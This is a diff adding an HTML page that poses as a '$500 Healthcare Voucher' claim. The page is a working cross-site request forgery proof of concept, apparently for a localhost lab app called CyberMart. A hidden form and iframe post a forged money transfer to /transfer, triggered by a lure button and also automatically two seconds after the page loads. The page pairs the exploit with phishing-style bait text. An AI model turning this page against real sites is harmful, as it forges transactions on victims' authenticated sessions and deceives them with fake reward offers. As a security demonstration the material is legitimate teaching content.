@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Free $500 Healthcare Voucher</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1e1e2f 0%, #2a2b4a 100%);
+            color: #ffffff;
+            margin: 0;
+            padding: 40px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+        .attack-card {
+            background: #ffffff;
+            color: #1a1a2e;
+            max-width: 600px;
+            width: 100%;
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            text-align: center;
+        }
+        h1 {
+            color: #d90429;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #4a5568;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+        .exploit-box {
+            background: #f7fafc;
+            border: 2px dashed #cbd5e0;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+            font-family: monospace;
+            font-size: 13px;
+        }
+        .btn-claim {
+            background: #d90429;
+            color: #ffffff;
+            border: none;
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 4px 12px rgba(217, 4, 41, 0.4);
+        }
+        .btn-claim:hover {
+            background: #ef233c;
+            transform: translateY(-2px);
+        }
+        .status-badge {
+            display: inline-block;
+            background: #e2e8f0;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="attack-card">
+        <h1>[REWARD NOTICE] Eligible for $500 Healthcare Grant</h1>
+        <p>Your regional health account has been pre-selected. Click below to verify your eligibility and claim credits immediately.</p>
+
+        <!-- Hidden Cross-Site Request Forgery Attack Form -->
+        <!-- Targets state-changing endpoint on http://localhost:3000/transfer -->
+        <form id="csrf-form" action="http://localhost:3000/transfer" method="POST" target="hidden_iframe">
+            <input type="hidden" name="recipient" value="Shah Nawaz">
+            <input type="hidden" name="amount" value="150.00">
+        </form>
+
+        <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+
+        <div class="exploit-box">
+            <strong>[CSRF EXPLOIT PAYLOAD DETAILS]:</strong><br>
+            Target Action: <code>POST http://localhost:3000/transfer</code><br>
+            Forged Parameters: <code>recipient=Shah Nawaz&amount=150.00</code><br>
+            Victim's Ambient Credentials: Active session cookie automatically attached by browser
+        </div>
+
+        <button type="button" class="btn-claim" onclick="launchExploit()">
+            Claim $500 Health Credit Now
+        </button>
+
+        <div id="exploit-status" class="status-badge">
+            Status: Waiting for interaction (or automatic execution in 2s)...
+        </div>
+    </div>
+
+    <script>
+        function launchExploit() {
+            const status = document.getElementById('exploit-status');
+            status.textContent = '[EXECUTION] Submitting forged state-changing transfer in background...';
+            status.style.background = '#fed7d7';
+            status.style.color = '#9b2c2c';
+
+            document.getElementById('csrf-form').submit();
+
+            setTimeout(() => {
+                status.textContent = '[SUCCESS] Forged Request Dispatched. Check CyberMart Dashboard to verify balance deduction.';
+                status.style.background = '#c6f6d5';
+                status.style.color = '#22543d';
+            }, 1000);
+        }
+
+        // Automatic execution demonstration upon landing
+        window.onload = function () {
+            setTimeout(launchExploit, 2000);
+        };
+    </script>
+</body>
+</html>
